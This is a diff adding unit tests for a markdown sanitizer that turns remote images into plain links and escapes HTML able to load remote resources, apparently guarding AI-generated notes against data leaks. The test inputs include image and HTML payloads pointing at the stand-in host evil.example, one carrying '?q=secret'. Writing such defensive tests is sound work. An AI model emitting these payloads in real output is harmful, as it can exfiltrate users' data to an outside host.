@@ -25,6 +25,29 @@ describe("generatedNote", () => {
   });
 });
 
+describe("generatedNote and remote content", () => {
+  const body = (reply: string) => { const text = generatedNote(reply, meta, props); return text.slice(props.findFrontMatter(text)?.end ?? 0); };
+
+  it("turns remote images into plain links", () => {
+    expect(body("![x](https://evil.example/?q=secret)")).toBe("[x](https://evil.example/?q=secret)");
+    expect(body("![x]( <//evil.example/a.png> )")).toBe("[x]( <//evil.example/a.png> )");
+    expect(body("![x][ref]\n\n[ref]: https://evil.example/a.png")).toBe("[x][ref]\n\n[ref]: https://evil.example/a.png");
+    expect(body("![ref]\n\n[ref]: https://evil.example/a.png")).toBe("[ref]\n\n[ref]: https://evil.example/a.png");
+  });
+
+  it("keeps local images", () => {
+    expect(body("![chart](assets/chart.png)")).toBe("![chart](assets/chart.png)");
+  });
+
+  it("escapes HTML that can load a remote resource", () => {
+    expect(body('<img src="https://evil.example/a.png">')).toBe('&lt;img src="https://evil.example/a.png">');
+    expect(body('<IMG SRC=https://evil.example/a.png>')).toBe("&lt;IMG SRC=https://evil.example/a.png>");
+    expect(body('<div style="background:url(https://evil.example/a)">x</div>')).toBe('&lt;div style="background:url(https://evil.example/a)">x</div>');
+    expect(body('<svg><image href="https://evil.example/a"/></svg>')).toBe('&lt;svg>&lt;image href="https://evil.example/a"/></svg>');
+    expect(body("<details><summary>More</summary>text</details>")).toBe("<details><summary>More</summary>text</details>");
+  });
+});
+
 describe("propertiesReply", () => {
   const note = "---\ntitle: A\n---\nBody\n";
   const expected = { text: "---\ntitle: B\ntags: [x]\n---\nBody\n" };
